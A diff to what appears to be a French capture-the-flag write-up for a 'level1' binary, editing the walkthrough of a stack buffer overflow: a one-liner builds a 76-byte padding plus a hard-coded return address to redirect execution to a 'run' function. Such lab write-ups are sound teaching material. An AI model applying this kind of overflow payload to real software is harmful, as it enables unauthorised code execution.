@@ -87,9 +87,9 @@ On remarque après plusieurs tests que le programme segfaulte à partir de plus 
 $ python -c "print 'A'\*80" | ./level1
 Segmentation fault (core dumped)
 
-On va donc exploiter level1 avec un buffer overflow et ainsi rediriger le programme vers la fonction run.
+On va donc exploiter level1 avec un buffer overflow et ainsi rediriger le programme vers la fonction run avec son l'adresse.
 
-$ python -c "print 'A'\*76 + '\x44\x84\x04\x08'" > /tmp/payload1
+$ python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/payload1
 
 $ cat /tmp/payload1 - | ./level1
 Good... Wait what?
